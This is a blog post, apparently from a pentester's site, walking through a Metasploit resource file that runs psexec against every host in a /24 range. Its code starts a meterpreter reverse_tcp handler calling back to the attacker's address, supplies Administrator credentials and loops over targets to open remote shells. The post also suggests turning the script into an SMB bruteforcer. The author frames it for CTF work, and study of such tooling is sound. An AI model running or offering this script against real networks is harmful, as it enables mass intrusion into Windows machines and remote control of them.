<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="">
  <meta name="generator" content="Hugo 0.14" />

  <title>

<body>
<div id="layout">

  
<a href="#menu" id="menuLink" class="menu-link">
  
  <span></span>
</a>
<div id="menu">

  

  <div class="pure-menu">
    <ul class="pure-menu-list">
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
      
        </li>
      
    </ul>
  </div>

  <div class="pure-menu social">
  <ul class="pure-menu-list">

    <li class="pure-menu-item">
      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
    </li>

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

  </ul>
</div>

  <div class="pure-g">
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>&copy; 2016. All rights reserved.</small>
  </div>
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
  </div>
</div>

</div>


  <div id="main">


<div class="header">
  <h1>Rapid fire PSEXEC for Metasploit</h1>
  <h2></h2>
</div>
<div class="content">
  <p>Exploit modules inside of metasploit don&rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.</p>

<p>// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&rsquo;ve broken it up into sections. Also take note of the &ldquo;setg&rdquo; which sets the variable globally so that I don&rsquo;t have to set it inside of the psexec module.</p>

<blockquote>
<p>use multi/handler<br />
setg PAYLOAD windows/meterpreter/reverse_tcp<br />
setg LHOST 192.168.1.114<br />
setg LPORT 80<br />
set ExitOnSession false</p>

<p>exploit -j -z</p>
</blockquote>

<p>This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.</p>

<blockquote>
<p>use windows/smb/psexec<br />
set SMBUser Administrator<br />
set SMBPass password123</p>
</blockquote>

<p>Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&rsquo;t joined to a domain they can take pretty much anything here.</p>

<p>However if they are actually joined to a domain, you either have to have the computer name (which definitely won&rsquo;t play well with a scanner easily) or use domain credentials.</p>

<blockquote>
<p>set SMBDomain .</p>
</blockquote>

<p>The &ldquo;.&rdquo; is something every Windows API programmer would know as it&rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&rsquo;t take either localhost or 127.0.0.1.</p>

<p>Next up, we don&rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.</p>

<blockquote>
<p>set DisablePayloadHandler true</p>
</blockquote>

<p>Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the <ruby> html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&rsquo;s API) to do really cool stuff.</p>

<p>More setup, but this time for the ruby portion. Using Metasploit&rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &ldquo;file:&rdquo; prefix.</p>

<blockquote>
<p><ruby><br />
require &lsquo;rex/socket/range_walker&rsquo;<br />
rhosts = &ldquo;192.168.92.0/24&rdquo;<br />
iplist = Rex::Socket::RangeWalker.new(rhosts)<br />
iplist.each do |rhost|</p>
</blockquote>

<p>So, we&rsquo;ve included RangeWalker, parsed it, and loaded it into an &lsquo;each&rsquo; for loop.</p>

<p>The &ldquo;self.run_single&rdquo; function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?</p>

<blockquote>
<p>self.run_single(&ldquo;set RHOST #{rhost}&rdquo;)<br />
self.run_single(&ldquo;exploit -j -z&rdquo;)</p>

<p>end<br />
</ruby></p>
</blockquote>

<p>That&rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &ldquo;-z -j&rdquo; just as we did with multi/handler.</p>

<p>Now, if your credentials worked on any of the IPs you&rsquo;ll have sessions waiting for you.</p>

<p>This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.</p>

<p>Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.</p>

</div>

</div>
</div>
<script src="http://localhost:1313/js/ui.js"></script>




</body>
</html>

